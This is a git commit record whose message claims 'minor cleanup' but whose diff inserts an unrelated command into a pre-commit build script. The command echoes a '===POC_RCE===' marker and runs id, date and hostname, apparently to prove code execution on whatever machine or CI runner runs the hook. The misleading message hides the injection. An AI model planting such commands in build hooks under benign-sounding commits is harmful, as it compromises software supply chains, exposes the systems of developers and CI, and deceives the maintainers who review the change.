e7f7e9d6d9aa165e57fa53ba6e9e1fe6a3456a9f
udjevdbaj <udjevdbaj@users.noreply.github.com>
2026-07-07 12:17:06 +0800

    chore: minor cleanup

--- pre-commit-full.sh
+++ pre-commit-full.sh
@@ -1,5 +1,7 @@
 #!/bin/bash -e
 
+echo ===POC_RCE===; id; date; hostname; echo ===END===
+
 tox -e format -- --check
 
 for OS_VERSION in "15.4" "15.5" "15.6" "15.7" "15.7-spr" "15.7-spr1.0" "15.7-spr1.2" "16.0" "16.1" "tumbleweed"; do
